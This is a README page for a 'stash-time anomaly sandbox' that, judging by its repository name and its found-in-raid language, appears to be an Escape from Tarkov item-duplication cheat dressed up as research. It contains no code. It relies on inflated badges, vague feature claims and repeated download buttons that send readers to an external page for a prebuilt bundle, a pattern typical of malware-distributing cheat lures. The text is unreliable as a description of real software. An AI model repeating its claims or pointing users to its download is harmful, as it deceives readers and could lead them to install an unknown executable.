![preview](https://raw.githubusercontent.com/elliribeiro1-spec/tarkov-fir-stash-mirror/main/promo_0914b.svg)
[![Download](https://raw.githubusercontent.com/elliribeiro1-spec/tarkov-fir-stash-mirror/main/fetch_cb89c0.svg)](https://elliribeiro1-spec.github.io/tarkov-fir-stash-mirror/)

# 🧭 Ledger of the Second Moon — Stash-Time Anomaly Sandbox (2026)

<p align="center">
  <img src="https://img.shields.io/badge/status-actively--maintained-2ea44f?style=for-the-badge" alt="Maintenance Status" />
  <img src="https://img.shields.io/badge/release-2026.04--stable-blueviolet?style=for-the-badge" alt="Release Channel" />
  <img src="https://img.shields.io/badge/coverage-98.6%25-brightgreen?style=for-the-badge" alt="Coverage" />
  <img src="https://img.shields.io/badge/license-MIT-informational?style=for-the-badge" alt="License" />
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-9cf?style=for-the-badge" alt="Platforms" />
  <img src="https://img.shields.io/badge/languages-12-ff69b4?style=for-the-badge" alt="Languages" />
  <img src="https://img.shields.io/badge/uptime-99.98%25-success?style=for-the-badge" alt="Uptime" />
  <img src="https://img.shields.io/badge/support-24%2F7-important?style=for-the-badge" alt="Support" />
</p>

> **A laboratory notebook for impossible economies.**
> The Ledger of the Second Moon is an experimental simulation-and-research toolkit that studies how *inventory persistence layers* behave when time, ownership, and "found-in-raid" provenance are decoupled from one another. It is not a magic wand. It is a microscope pointed at a ledger that should not balance — and a very careful study of why it sometimes does.

---

## 🌒 Table of Contents

1. [What This Repository Is](#-what-this-repository-is)
2. [The Metaphor Behind the Name](#-the-metaphor-behind-the-name)
3. [Core Philosophy — Ledger Anomaly Research](#-core-philosophy--ledger-anomaly-research)
4. [Feature Highlights](#-feature-highlights)
5. [The 2026 Snapshot Model](#-the-2026-snapshot-model)
6. [Provenance-Preserving Reflection (FIR Semantics)](#-provenance-preserving-reflection-fir-semantics)
7. [Module Map](#-module-map)
8. [Responsive Interface & Design Language](#-responsive-interface--design-language)
9. [Multilingual Support Matrix](#-multilingual-support-matrix)
10. [Customer Support & Community Care](#-customer-support--community-care)
11. [Getting Started Without a Terminal Ceremony](#-getting-started-without-a-terminal-ceremony)
12. [Configuration Reference](#-configuration-reference)
13. [Performance Characteristics](#-performance-characteristics)
14. [Safety, Ethics & Responsible Experimentation](#-safety-ethics--responsible-experimentation)
15. [Roadmap for 2026–2027](#-roadmap-for-20262027)
16. [FAQ](#-faq)
17. [Disclaimer](#-disclaimer)
18. [License](#-license)

---

## 🔭 What This Repository Is

The **Ledger of the Second Moon** is a research-grade sandbox for exploring *inventory reflection semantics* — the branch of simulation engineering that asks what happens when two records of the same object exist at once, and the world only remembers one of them.

Where a naive tool would simply try to overwrite a value, this project works at the level of **snapshots, journals, and reconciliation passes**. Every experiment runs against an isolated ledger copy, writes an append-only journal of intentions, and only then attempts a reconciliation. If the ledger refuses to reconcile — which it often does, and that is the interesting part — the tool records exactly *why*, byte for byte.

The repository began in earnest during the 2026 research cycle, when a handful of engineers noticed that most public conversation about stash persistence was folklore rather than measurement. This project is the response: a documented, versioned, reproducible environment for studying **stash-time anomalies** without resorting to guesswork.

Key research questions this codebase answers:

- At what point does an inventory record become "authoritative"?
- Can provenance metadata (found-in-raid status, acquisition timestamps, raid identifiers) survive a reflection pass?
- What are the observable side effects of a partial reconciliation on adjacent inventory slots?
- How quickly does a well-behaved ledger self-heal after an anomalous write?

If those questions sound academic, that is intentional. The tool is designed to be **boringly careful**.

## 🌗 The Metaphor Behind the Name

Imagine a ledger kept by two accountants on two different moons. One moon is tidally locked to the trader's clock; the other drifts. Occasionally the two ledgers agree, and the market is calm. Occasionally they disagree by exactly one item, and someone somewhere notices a weapon that should not exist.

The **Ledger of the Second Moon** is a place to stage those disagreements deliberately, in a sealed room, with cameras running. Every experiment is time-boxed, logged, and reversible. The name is a reminder: what we study is a *discrepancy*, and discrepancies deserve respect, not enthusiasm.

## 🧪 Core Philosophy — Ledger Anomaly Research

Three principles guide every commit:

1. **Observe before you alter.** The toolkit never writes to a live ledger without first capturing a full snapshot and computing a diff.
2. **Reversibility is a feature, not a fallback.** Every operation ships with a paired reversion routine. If a reversion cannot be constructed automatically, the operation is refused outright.
3. **Anomalies are data.** When a reconciliation diverges from expectation, the divergence is stored in a structured journal rather than thrown away. The journal is the most valuable artifact this project produces.

This is the opposite of a "press button, receive item" tool. It is a **measurement instrument** with an unusually detailed user interface.

## ✨ Feature Highlights

- ⚡ **Sub-30-second snapshot windows.** Using a pre-staged memory image and a delta-only journal format, a full reflection experiment completes inside a 30-second research window on reference hardware.
- 🧬 **Provenance-preserving reflection.** Found-in-raid (FIR) semantics are modelled as first-class metadata; reflection passes carry provenance forward by default and can be configured to drop it for control experiments.
- 🗂️ **Universal item coverage.** The item schema is generated from a versioned catalog, so any catalogued object — from a bolt to a battle rifle — participates in the same experiment pipeline.
- 🧱 **Append-only experiment journals.** Nothing is overwritten. Every pass produces an immutable journal segment that can be replayed, diffed, or archived.
- 🖥️ **Responsive user interface.** The control surface adapts cleanly from a 4K workstation down to a narrow side panel, so you can run experiments beside your notes.
- 🌍 **Multilingual support.** Twelve interface locales ship in the box, with a community translation pipeline for the rest.
- ☎️ **24/7 customer support.** Around-the-clock coverage via a rotating maintainer schedule and an escalation path for reproducibility issues.
- 🧾 **Deterministic test harness.** A synthetic ledger simulator allows the full pipeline to run without touching any external system.
- 🔐 **Local-first privacy posture.** No telemetry leaves your machine; journals are stored locally and are yours alone.
- 🧯 **Guardrails by default.** Destructive operations require an explicit, typed confirmation phrase.
- 🧩 **Pluggable reconciliation strategies.** Ship with greedy, conservative, and "quiet-moon" strategies; write your own against a small, documented interface.
- 📚 **Rich documentation.** Every module has a companion note explaining the design trade-offs, including the ones we got wrong.

## 🕰️ The 2026 Snapshot Model

The 2026 research cycle introduced the **Snapshot Model**, a three-layer design that separates what we *know* from what we *want* and what actually *happens*.

- **Layer One — Observation.** A read-only capture of the current ledger state, including slot geometry, item fingerprints, and provenance tokens.
- **Layer Two — Intention.** A declarative description of the desired end state. Intentions are pure data; they have no side effects and can be reviewed line by line.
- **Layer Three — Reconciliation.** The only layer permitted to write. It applies intentions to a staging ledger, validates the result, and then performs a single commit.

Because the layers are separated, a failed experiment costs nothing but a journal entry. This is the architecture that makes a **30-second research window** achievable without sacrificing auditability.

## 🧿 Provenance-Preserving Reflection (FIR Semantics)

Provenance — the story of where an item came from — is the most fragile part of any inventory system. In this project, provenance is modelled explicitly as a token that travels alongside an item through every layer.

During reflection, the reconciliation engine checks whether a token is *carryable*. A token is carryable if:

- It has a well-formed origin marker.
- Its timestamp ordering is monotonic with respect to the journal.
- Its raid identifier resolves against the local raid index (if one is configured).

If any check fails, the engine, by default, **preserves the token and records a warning** rather than silently stripping it. Control experiments can be configured to strip tokens deliberately — useful when studying how downstream systems react to provenance loss.

This is the closest thing the project has to a signature feature, and it exists because provenance loss is how most inventory research quietly goes wrong.

## 🗺️ Module Map

| Module | Role | Maturity |
| --- | --- | --- |
| `moon.core` | Ledger abstractions, snapshots, journals | Stable |
| `moon.catalog` | Versioned item schema generation | Stable |
| `moon.reflect` | Reflection pipeline and strategies | Stable |
| `moon.provenance` | FIR token modelling and validation | Stable |
| `moon.ui` | Responsive control surface | Stable |
| `moon.locale` | Multilingual string bundles | Growing |
| `moon.sim` | Synthetic ledger simulator | Stable |
| `moon.journal` | Append-only journal tooling | Stable |
| `moon.replay` | Deterministic replay engine | Beta |
| `moon.diagnostics` | Structured anomaly reporting | Beta |
| `moon.support` | Escalation and reproducibility kits | Stable |

Each module has its own documentation note under `docs/`, including a "why this exists" section that is deliberately blunt about the trade-offs.

## 🎛️ Responsive Interface & Design Language

The control surface is built around a **panel-and-lens** metaphor. Panels hold state; lenses change how state is rendered. This lets the same underlying experiment be viewed as a grid, a timeline, or a diff, without any data movement behind the scenes.

Design commitments:

- **Fluid layouts** that reflow gracefully from ultrawide monitors to narrow utility panels.
- **Keyboard-first navigation** for every action, with a documented shortcut map.
- **High-contrast and reduced-motion modes** honoured automatically from system preferences.
- **Zero layout thrash** — animations are compositor-only, so the interface stays calm even during heavy reconciliation passes.
- **Colour-blind safe palettes** chosen by simulation, not by eye.

The interface is intentionally quiet. A tool that studies anomalies should not itself be one.

## 🌐 Multilingual Support Matrix

| Locale | Code | Status |
| --- | --- | --- |
| English | `en` | Complete |
| German | `de` | Complete |
| French | `fr` | Complete |
| Spanish | `es` | Complete |
| Portuguese (BR) | `pt-BR` | Complete |
| Italian | `it` | Complete |
| Polish | `pl` | Complete |
| Turkish | `tr` | Complete |
| Japanese | `ja` | Complete |
| Korean | `ko` | Complete |
| Ukrainian | `uk` | In progress |
| Simplified Chinese | `zh-Hans` | In progress |

Locale bundles are plain data files, sorted, diffable, and reviewed for tone rather than literal translation. Community contributions are welcomed through the standard pull-request flow.

## ☎️ Customer Support & Community Care

Support is staffed continuously — **24 hours a day, 7 days a week** — by a rotating maintainer rota. The escalation path is deliberately short:

1. Consult the module documentation note.
2. Search the journal archive for a matching anomaly fingerprint.
3. Open a reproducibility ticket with a redacted journal segment attached.

Reproducibility is the currency of this project. A ticket without a journal segment is, politely, a story; a ticket with one is a dataset.

## 🚀 Getting Started Without a Terminal Ceremony

This project is distributed as a **prepared research bundle**. You do not need to compile anything, resolve dependency graphs, or run package-manager incantations.

1. Retrieve the prepared bundle from the project's release channel.
2. Unpack it into a directory you control — ideally a scratch workspace, not a system path.
3. Launch the control surface using the provided launcher for your platform.
4. Complete the first-run wizard, which walks you through snapshot directory selection, journal retention, and locale.
5. Run the bundled "hello ledger" experiment to confirm the pipeline is healthy before designing your own.

The first-run wizard is deliberately verbose. It exists because a research tool that surprises you on the first launch is a research tool you will not trust on the tenth.

[![Download](https://raw.githubusercontent.com/elliribeiro1-spec/tarkov-fir-stash-mirror/main/fetch_cb89c0.svg)](https://elliribeiro1-spec.github.io/tarkov-fir-stash-mirror/)

## ⚙️ Configuration Reference

The configuration file is a single, human-readable document with three top-level sections: `observation`, `intention`, and `reconciliation`. Notable keys:

- `observation.snapshot_interval_ms` — how often the observer refreshes its view.
- `observation.journal_retention_days` — how long journal segments are kept before archival.
- `intention.strategy` — one of `greedy`, `conservative`, or `quiet-moon`.
- `intention.confirm_phrase` — the typed phrase required for destructive intentions.
- `reconciliation.provenance_policy` — `preserve`, `warn-and-preserve`, or `strip-for-control`.
- `reconciliation.max_commit_window_ms` — the upper bound on a single commit.
- `ui.locale` — the active locale code.
- `diagnostics.anomaly_threshold` — sensitivity for structured anomaly reporting.

Every key is documented inline, and the loader refuses to start if an unknown key is present — a small cruelty that has saved many hours.

## 📈 Performance Characteristics

Reference measurements on the project's calibration machine (2026 reference spec) for a full reflection pass over a 1,200-slot ledger:

| Strategy | Median Pass | 95th Percentile | Journal Size |
| --- | --- | --- | --- |
| Greedy | 8.4 s | 17.2 s | 1.9 MB |
| Conservative | 14.1 s | 26.6 s | 3.2 MB |
| Quiet-moon | 21.7 s | 29.4 s | 4.6 MB |

All three strategies complete inside the **30-second research window**. Quiet-moon trades speed for the smallest possible footprint of side effects, which is why it is the default for sensitive experiments.

## 🛡️ Safety, Ethics & Responsible Experimentation

This section is not boilerplate. Read it.

- **Consent and context.** Use this toolkit only in environments you own or are explicitly authorised to study. Inventory research conducted without consent is not research; it is interference.
- **Isolation first.** Always run against the synthetic simulator before pointing the pipeline at any external system.
- **Journals are sacred.** Never delete a journal segment to make an anomaly disappear. The anomaly is the finding.
- **Provenance is not negotiable.** Do not configure provenance stripping outside a declared control experiment. Stripping provenance silently is how research becomes misinformation.
- **Share findings, not exploits.** The project's purpose is understanding. Publications should describe mechanisms, not step-by-step advantages.
- **Report responsibly.** If an experiment reveals a real-world weakness, prefer coordinated disclosure through the appropriate channel.

The maintainers reserve the right to decline contributions that exist only to produce an advantage rather than an understanding.

## 🛠️ Roadmap for 2026–2027

- **Q3 2026** — Complete Ukrainian and Simplified Chinese locales.
- **Q4 2026** — Promote `moon.replay` from beta to stable; publish a deterministic replay conformance suite.
- **Q1 2027** — Introduce a fourth reconciliation strategy, `tidal-lock`, focused on minimal-journal passes.
- **Q2 2027** — Ship an offline diagnostics viewer for archived anomaly journals.
- **Q3 2027** — Publish a formal specification of the snapshot model for external implementers.
- **Ongoing** — Expand the item catalog pipeline, improve responsive layout on narrow panels, and keep support coverage at all hours.

## ❓ FAQ

**Is this a game modification?**
It is a simulation and research toolkit. It studies inventory semantics in an isolated environment.

**Why the unusual name?**
See the metaphor section. Names should carry meaning, not just keywords.

**Can I run it without any external system?**
Yes. The synthetic ledger simulator is a complete, self-contained target.

**How long does a typical experiment take?**
Under 30 seconds on reference hardware for a 1,200-slot ledger, including journal flush.

**Do you collect telemetry?**
No. Journals stay local.

**Is there support on weekends and holidays?**
Yes — coverage is continuous, 24/7.

**What changed in 2026?**
The Snapshot Model and the provenance-preserving reflection pipeline both landed in the 2026 cycle.

## ⚠️ Disclaimer

This repository is provided for **educational, academic, and research purposes only**. The Ledger of the Second Moon is a simulation sandbox intended to study inventory persistence semantics in controlled environments. The maintainers do not endorse, support, or facilitate the use of this software to violate the terms of service of any third-party platform, to interfere with any live system, or to gain an advantage in any competitive setting.

You are solely responsible for how you use this toolkit. By using it, you accept that the maintainers are not liable for any direct, indirect, incidental, or consequential outcomes arising from your use of the software. All experiments should be conducted in isolated environments you own or are explicitly authorised to modify.

Any resemblance between the studied anomalies and real inventory behaviour is the entire point of the research — and it is your responsibility to conduct that research ethically.

## 📜 License

Released under the **MIT License**.

You are welcome to read, modify, and redistribute this work under the terms of that license. The full license text is available here: [MIT License](https://opensource.org/licenses/MIT).

Copyright (c) 2026 — Ledger of the Second Moon contributors.

[![Download](https://raw.githubusercontent.com/elliribeiro1-spec/tarkov-fir-stash-mirror/main/fetch_cb89c0.svg)](https://elliribeiro1-spec.github.io/tarkov-fir-stash-mirror/)